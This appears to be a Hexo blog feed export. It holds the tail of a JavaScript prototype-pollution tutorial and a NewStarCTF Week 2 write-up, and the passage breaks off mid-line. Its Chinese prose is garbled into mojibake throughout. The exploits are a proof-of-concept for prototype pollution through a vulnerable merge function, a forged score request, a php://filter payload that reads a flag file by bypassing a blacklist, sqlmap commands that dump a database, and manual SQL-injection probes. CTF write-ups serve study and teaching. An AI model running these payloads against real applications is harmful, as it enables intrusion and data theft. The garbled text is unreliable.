å‡½æ•°çš„prototypeçš„è¿›è¡ŒæŸ¥æ‰¾ï¼Œç›´è‡³æŸ¥æ‰¾åˆ°Objectæ—¶ï¼Œå°±æ²¡æœ‰æŒ‡å‘äº†ã€‚å¦‚æœæœ€ç»ˆæŸ¥æ‰¾å¤±è´¥ä¼šè¿”å›undefinedæˆ–æŠ¥é”™ã€‚</p><p>é€šè¿‡ä¸€æ®µ<code>java</code>ä»£ç å¯¹æ¯”ä¸¤è€…çš„å¼‚åŒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<span class="hljs-comment">//åŒ…åä¸ºTestçš„ç±»</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<span class="hljs-comment">//å…¬å…±å­—ç¬¦ä¸²å±æ€§name</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//Sonç±»ç»§æ‰¿è‡ªFatherç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Son</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>.name = <span class="hljs-string">&quot;father&quot;</span>;<span class="hljs-comment">//super å…³é”®å­—ç”¨äºåœ¨å­ç±»ä¸­è®¿é—®çˆ¶ç±»çš„æˆå‘˜å˜é‡ã€æ–¹æ³•å’Œæ„é€ å‡½æ•°ã€‚</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//alertæ–¹æ³•ï¼Œè¿”å›ç±»å‹ä¸ºvoid(ä¸ä¼šè¿”å›ä»»ä½•å€¼)</span><br>        System.out.println(<span class="hljs-string">&quot;i am son&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s1.name);<span class="hljs-comment">//System.outæ˜¯ä¸€ä¸ªæ ‡å‡†è¾“å‡ºæµå¯¹è±¡ï¼Œprintln()æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†æŒ‡å®šçš„å‚æ•°æ‰“å°åˆ°æ§åˆ¶å°ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</span><br>        s1.name = <span class="hljs-string">&quot;son&quot;</span>;<br>        System.out.println(s1.name);<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s2.name);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br>father<br>son<br>father<br></code></pre></td></tr></table></figure><p><code>javaæ˜¯åŸºäºå¯¹è±¡ç»§æ‰¿ï¼Œjavascriptæ˜¯åŸºäºåŸå‹ç»§æ‰¿</code></p><h4 id="æ±¡æŸ“åŸç†"><a href="#æ±¡æŸ“åŸç†" class="headerlink" title="æ±¡æŸ“åŸç†"></a>æ±¡æŸ“åŸç†</h4><p>å¯¹äºè¯­å¥ï¼š<code>object[a][b] = value</code> å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º<code>__proto__</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡</p><h4 id="åˆ©ç”¨æ‰‹æ®µ"><a href="#åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µ"></a>åˆ©ç”¨æ‰‹æ®µ</h4><p>ç°åœ¨æˆ‘ä»¬å¤§è‡´å¯ä»¥çŸ¥é“ï¼šå¦‚æœå¯ä»¥é€šè¿‡æŸç§æ–¹æ³•æ§åˆ¶<code>å¯¹è±¡.__proto__</code>çš„å€¼ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é—´æ¥ä¿®æ”¹ç»§æ‰¿è¯¥åŸå‹å¯¹è±¡çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p>1.<strong>å¯¹è±¡merge</strong> <strong>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</strong> ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ç”¨äºå°†ä¸€ä¸ªæºå¯¹è±¡çš„å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//éå†sourceçš„æ‰€æœ‰å±æ€§</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//å¯¹äºæ¯ä¸ªå±æ€§ï¼Œè‹¥åŒæ—¶å­˜åœ¨äºæºå¯¹è±¡å’Œç›®æ ‡å¯¹è±¡ä¸­</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåµŒå¥—å¯¹è±¡ï¼Œéœ€è¦é€’å½’è°ƒç”¨mergeå‡½æ•°ï¼Œå°†æºå¯¹è±¡çš„åµŒå¥—å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡çš„å¯¹åº”åµŒå¥—å±æ€§ä¸­ã€‚</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//éåµŒå¥—å±æ€§ï¼Œç›´æ¥å°†æºå¯¹è±¡çš„å±æ€§å€¼èµ‹ç»™ç›®æ ‡å¯¹è±¡çš„å¯¹åº”å±æ€§ã€‚</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œå¦‚æœæˆ‘ä»¬è®©keyæ˜¯<code>__proto__</code>çš„è¯é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±å¯ä»¥å¯¹åŸå‹é€ æˆå½±å“ï¼Œæœ€ç»ˆå½±å“åˆ°å®ä¾‹åŒ–å‡ºæ¥çš„ç±»å‘¢ï¼Ÿ</strong></p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1,2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1)<span class="hljs-comment">//&#123; a: 1, b: 2 &#125;,protoæ²¡æœ‰è¢«å½“åšé”®å</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆ<code>o1</code>è¢«æ±¡æŸ“äº†è€Œ<code>o3</code>æ²¡æœ‰è¢«æ±¡æŸ“?</p><p>æ‰“å¼€nodeçœ‹ä¸‹<code>o2</code>çš„<code>key</code>ï¼š</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">Welcome to Node.js v18.18.0.<br>Type &quot;.help&quot; for more information.<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;&#125;</span><br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> o2)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);&#125;</span><br>a<br>b<br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2</span><br>&#123; a: 1 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span></span><br>&#123; b: 2 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>[Object: null prototype] &#123;&#125;  //æœ€ä¸Šå±‚çš„objectï¼Œå¹¶æ²¡æœ‰ä»»ä½•å±æ€§<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>null<br>&gt;å¯ä»¥çœ‹åˆ°o2çš„keyåªæœ‰a,bæ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„__proto__ï¼Œå¹¶æ³¨æ„æœ€åå‡ è¡Œï¼<br></code></pre></td></tr></table></figure><p>åŸå› å¾ˆå¥½ç†è§£ï¼šåœ¨<code>o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</code>ä¸­ï¼Œ<code>&quot;__proto__&quot;:&#123;b:2&#125;</code>ç­‰ä»·äº<code>o2.__proto__=&#123;b:2&#125;</code>ï¼Œä¹Ÿå°±æ˜¯<code>o2</code>è¿™ä¸ªå®ä¾‹çš„<code>__proto__</code>å±æ€§ã€‚<code>__proto__</code>å¹¶æ²¡è¢«å½“æˆé”®åè§£æã€‚</p><p>æˆ‘ä»¬éœ€è¦è¿™æ ·ä¿®æ”¹(<code>åˆ©ç”¨JSON.parse</code>)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parseçš„å­˜åœ¨å¯ä»¥å°†JSONå­—ç¬¦ä¸²è§£æä¸ºJavaScriptå¯¹è±¡ï¼Œè¿™æ ·ä¸€æ¥å°±å­˜åœ¨o2.__protp__.b=2,å¹¶æŠŠè¿™ä¸œè¥¿èµ‹å€¼ç»™ä¹‹å‰ä¸å­˜åœ¨çš„o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸‹è¿è¡Œè¿‡ç¨‹ï¼š</p><p>é¦–å…ˆæ˜¯<code>o1[a]=02[a]=1</code>ï¼Œç„¶åè¿›è¡Œ<code>o1.__proto__</code>å’Œ<code>o2.__proto__</code>(æ³¨æ„è¿™æ˜¯å…±æœ‰çš„ï¼Œæ‰€ä»¥è¿›è¡Œå¾ªç¯<code>merge</code>è¿‡ç¨‹)ï¼Œå³<code>o1.__proto__.b=o2.__proto__.b=2</code>ï¼Œå³<code>Object.prototype.b=2</code>ã€‚</p><p>ä¹Ÿå°±æ˜¯æœ€é¡¶å±‚çš„<code>Object.prototype</code>æ‰€æŒ‡å‘çš„å¯¹è±¡æ·»åŠ äº†å±æ€§,æ‰€ä»¥æˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ªå¯¹è±¡ä¹Ÿå°±æœ‰äº†bè¿™ä¸ªå±æ€§(é—´æ¥æ‹¥æœ‰ï¼Œä¼šå‘ä¸ŠæŸ¥ä¸€ä¸ª<code>.proto__</code>)ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>jlkl.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">11</span><span class="hljs-regexp">/06/</span>Web_16/<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51586883/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119867720</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7182</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week2</title>
    <link href="/2023/10/12/NewStarCTF_Week2/"/>
    <url>/2023/10/12/NewStarCTF_Week2/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬äºŒå‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h2><p>å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ</p><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªå°æ¸¸æˆï¼Œåˆ†æ•°åˆ°è¾¾<code>100000</code>æ‰èƒ½æ‹¿<code>flag</code>:</p><p><img src="/img/youxi1.png" alt="youxi1"></p><p>ç›®æµ‹æ˜¯è¦é€šè¿‡<code>burpsuite</code>ä¼ªé€ åˆ†æ•°æ•°æ®åŒ…ï¼Œå³é”®æºç æ²¡å•¥ä¸œè¥¿ï¼Œ<code>F12</code>æ‰“å¼€è°ƒè¯•å™¨ï¼Œå‘ç°<code>app_v2.js</code>ï¼š</p><p>åœ¨æ¸¸æˆè¿›è¡Œçš„è¿‡ç¨‹ä¸­å¹¶ä¸å­˜åœ¨æ•°æ®åŒ…ä¼ é€’ï¼Œé™¤éæ¸¸æˆç»“æŸæ—¶åˆ†æ•°<code>&gt;100000</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//æ¸¸æˆç»“æŸ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); <span class="hljs-comment">//åˆ›å»ºXMLHttpRequestçš„å¯¹è±¡xhrï¼Œä¸æœåŠ¡å™¨é€šä¿¡</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//æŒ‡å®šäº¤äº’æ–¹å¼POSTï¼Œå¹¶å‘é€åˆ°api.php</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<span class="hljs-comment">//è®¾ç½®è¯·æ±‚å¤´ï¼ŒJSONæ ¼å¼</span><br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-comment">//ä¸‹é¢è¿™éƒ¨åˆ†å‡½æ•°ç”¨æ¥è¿”å›flag</span><br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æˆç»©ï¼š&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥ä¼ªé€ ä¸€ä¸ªåŒ…å¥½äº†ï¼š<code>POST</code>æ–¹æ³•<code>api.php</code>ï¼Œ<code>host</code>å°±æ˜¯é¶æœºåœ°å€ï¼Œ<code>Content-Type:application/json</code>ï¼Œæ³¨æ„POSTçš„æ•°æ®è¦æ˜¯JSONæ ¼å¼è€Œä¸”ç©ºä¸€è¡Œï¼Œå…¶å®ƒä»»æ„:</p><p><img src="/img/youxi2.png" alt="youxi2"></p><p>å¦‚æœæ•°æ®åŒ…æ ¼å¼æœ‰é—®é¢˜å®ƒä¼šæç¤º<code>&#123;&quot;message&quot;:&quot;so low score&quot;&#125;</code></p><p>çœ‹äº†å®˜æ–¹<code>wp</code>å‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šç›´æ¥æ‰“å¼€æ§åˆ¶å°ä¼ <code>gameScore=9999999999</code>ï¼Œç„¶åç­‰æ¸¸æˆç»“æŸï¼š</p><p><img src="/img/youxi3.png" alt="youxi3"></p><h2 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h2><p>åŒ…å«ä¹Ÿæœ‰å±å®³ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br><br></code></pre></td></tr></table></figure><p>ç›®æµ‹è¦ç”¨ä¼ªåè®®è¯»<code>flag.php</code>çš„æºç ï¼Œæ²¡è¿‡æ»¤<code>filter</code>ä½†è¿‡æ»¤äº†<code>base|rot/</code>è€Œä¸”æ˜¯<code>/i</code>æ¨¡å¼ï¼Œä¸è¿‡æ²¡å•¥å½±å“é™¤äº†<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>è¿˜æœ‰å¾ˆå¤šå…¶å®ƒæ–¹æ³•ã€‚</p><p>ä¹‹å‰æ”»é˜²ä¸–ç•Œæ­£å¥½åšè¿‡ä¸€ä¸ªç±»ä¼¼çš„ï¼Œpayload:</p><p><code>?file=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php</code></p><p>æºç æ˜¯è¿™ä¸ªä¸œè¥¿ï¼š</p><p><code>&lt;?php //flag&#123;af954c6a-1ac4-4e23-a235-fc4108a03783&#125;</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>è™½ç„¶ä½¿ç”¨<code>sqlmap</code>æ˜¯æ²¡æœ‰çµé­‚çš„ï¼Œä½†æˆ‘è¿˜æ˜¯ç”¨äº†~</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 --current-db<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf --tables<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag --<span class="hljs-built_in">columns</span><br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag -C flag --dump<br></code></pre></td></tr></table></figure><p><code>flag:flag&#123;76715552-3304-4be1-b5e7-235d60421e41&#125;</code></p><p>åé¢çœ‹äº†ä¸‹wpï¼Œå› ä¸ºå¤ªä¹…æ²¡åšè¿™ç§æ‰‹æ³¨äº†ä¹Ÿè¯•äº†è¯•ï¼š</p><p>å…ˆåˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼š</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">--+</span>    æ­£å¸¸å›æ˜¾ï¼Œåˆæ­¥çŒœæµ‹å­—ç¬¦å‹æ³¨å…¥<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; And <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">--+</span>   